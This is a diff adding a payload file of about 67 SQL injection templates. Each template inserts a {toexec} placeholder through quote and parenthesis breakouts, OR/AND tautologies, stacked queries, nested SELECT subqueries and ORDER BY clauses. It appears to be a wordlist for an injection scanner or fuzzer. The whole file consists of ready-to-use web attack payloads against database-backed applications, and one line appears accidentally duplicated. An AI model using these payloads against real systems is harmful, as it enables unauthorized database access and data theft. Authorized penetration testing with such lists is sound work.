@@ -1,0 +1,67 @@
+" or {toexec}#
+" or {toexec}--
+" or {toexec}="
+") or {toexec}#
+") or {toexec}--
+") or {toexec}="
+")) or {toexec}#
+")) or {toexec}--
+")) or {toexec}="
+"));{toexec}--
+");{toexec}--
+";{toexec}--
+&&{toexec}
+&&{toexec}#
+&&{toexec}--
+' AnD {toexec} ANd '1
+' or {toexec}#
+' or {toexec}--
+' or {toexec}='
+'&&{toexec}&&'1
+') or {toexec}#
+') or {toexec}--
+') or {toexec}='
+')) or {toexec}#
+')) or {toexec}--
+')) or {toexec}='
+'));{toexec}--
+');{toexec}--
+';{toexec}--
+(SELECT * FROM (SELECT({toexec}))ecMj)
+(SELECT * FROM (SELECT({toexec}))ecMj)#
+(SELECT * FROM (SELECT({toexec}))ecMj)--
+));{toexec}--
+);{toexec}--
++ {toexec} + '
++{toexec}+'
+1 or {toexec}#
+1 or {toexec}--
+1) or {toexec}#
+1) or {toexec}--
+1)) or {toexec}#
+1)) or {toexec}--
+;{toexec}--
+AND (SELECT * FROM (SELECT({toexec}))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT({toexec}))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT({toexec}))nQIP)
+AND (SELECT * FROM (SELECT({toexec}))nQIP)#
+AND (SELECT * FROM (SELECT({toexec}))nQIP)--
+AND 2947={toexec}
+AnD {toexec}
+AnD {toexec}#
+AnD {toexec}--
+OR 2947={toexec}
+ORDER BY {toexec}
+ORDER BY {toexec}#
+ORDER BY {toexec}--
+or {toexec}
+or {toexec}#or {toexec}#
+or {toexec}--
+or {toexec}="
+or {toexec}='
+{toexec}
+{toexec}#
+{toexec}--
+{toexec}/*' or {toexec} or '" or {toexec} or "*/
+{toexec}="
+{toexec}='
